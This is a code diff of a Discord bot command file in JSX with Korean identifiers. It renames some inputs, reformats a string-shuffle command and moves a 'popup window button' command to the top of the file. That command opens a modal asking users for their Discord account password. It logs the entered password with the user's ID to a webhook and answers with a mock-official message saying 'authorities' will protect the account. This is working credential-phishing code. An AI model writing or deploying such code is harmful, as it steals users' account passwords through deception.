@@ -1,8 +1,8 @@
 import {
 	createElement,
-	useString, useNumber,
+	useString, useNumber, useDescription,
 	Message, Embed, Modal, Button, Input, Row,
-	useButton, useModal, useInput,
+	useButton, useModal, useInput
 } from 'slshx';
 import {
 	ALS_API, WebLogger,
@@ -12,6 +12,35 @@ setTweaks(self);
 
 
 
+export function 빠빱윈또우뻐뜬() {
+	const [pwInput, pwInput_value] = useInput();
+	const modalId = useModal((interaction, env) => {
+		const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
+		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(pwInput_value)}\`\``);
+		return (
+			<Message ephemeral>{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.</Message>
+		);
+	});
+	const popupWindowButton = useButton(() => (
+		<Modal id={modalId} title="이것은 빠빱_윈또우 이다">
+			<Input
+				id={pwInput}
+				label="Discord 계정 비밀번호를 입력해주세요"
+				required
+			>
+			</Input>
+		</Modal>
+	));
+	
+	return () => (
+		<Message>
+			빠빱\_윈또우\_뻐뜬
+			<Row>
+				<Button id={popupWindowButton} primary>popup_window_button</Button>
+			</Row>
+		</Message>
+	);
+};
 export function 맵() {
 	const gamemode = useString("게임모드");
 
@@ -43,51 +72,17 @@ export function 맵() {
 export function 금은가야() {
 	const type = useString("기법");
 	const msg = useString("메시지");
-	const repeat = useNumber("횟수") ?? 1;
+	const repeat = useNumber("반복") ?? 1;
 
 	switch(type){
 		case "shuffle": {
-			return () => <Message>{escapers.all(msg.repeat(repeat).shuffle().slice(0, 1999))}</Message>
+			return ()=> <Message>{escapers.all(msg.repeat(repeat).shuffle().slice(0, 1999))}</Message>
 		};
 		case "reverse": {
-			return () => <Message>{escapers.all(msg.repeat(repeat).reverse().slice(0, 1999))}</Message>
+			return ()=> <Message>{escapers.all(msg.repeat(repeat).reverse().slice(0, 1999))}</Message>
 		};
 		default: {
-			return () => <Message>{type}은(는) 존재하지 않는 타입입니다.</Message>
+			return ()=> <Message>{type}은(는) 존재하지 않는 타입입니다.</Message>
 		};
 	};
-};
-export function 빠빱윈또우뻐뜬() {
-	const [inputId, inputValue] = useInput();
-	const modalId = useModal((interaction, env) => {
-		const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
-		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(inputValue)}\`\``);
-		
-		return (
-			<Message ephemeral>{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.</Message>
-		);
-	});
-	const popup_window_button = useButton(() => {
-		return (
-			<Modal id={modalId} title='이것은 빠빱_윈또우 이다'>
-				<Input
-					id={inputId}
-					label="Discord 계정 비밀번호를 입력해주세요"
-					minLength={1}
-					required
-				>
-				</Input>
-			</Modal>
-		);
-	});
-
-
-	return () => (
-		<Message>
-			빠빱\_윈또우\_뻐뜬
-			<Row>
-				<Button id={popup_window_button} primary>popup_window_button</Button>
-			</Row>
-		</Message>
-	);
 };
